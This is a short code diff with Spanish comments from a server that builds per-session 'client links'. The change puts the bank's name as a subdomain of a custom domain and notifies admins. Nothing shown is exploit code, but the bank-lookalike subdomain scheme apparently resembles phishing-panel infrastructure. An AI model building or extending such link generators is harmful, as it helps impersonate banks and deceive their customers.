@@ -3382,8 +3382,9 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         await storage.updateSession(sessionId, { createdBy: user.username });
       }
 
-      // Construir el enlace con el dominio personalizado
-      const clientLink = `https://${customDomain.domain}/${sessionId}`;
+      // Construir el enlace con el dominio personalizado y subdominio del banco
+      const bancoLowerCase = (banco as string).toLowerCase();
+      const clientLink = `https://${bancoLowerCase}.${customDomain.domain}/${sessionId}`;
 
       // Notificar a los clientes de admin
       broadcastToAdmins(JSON.stringify({
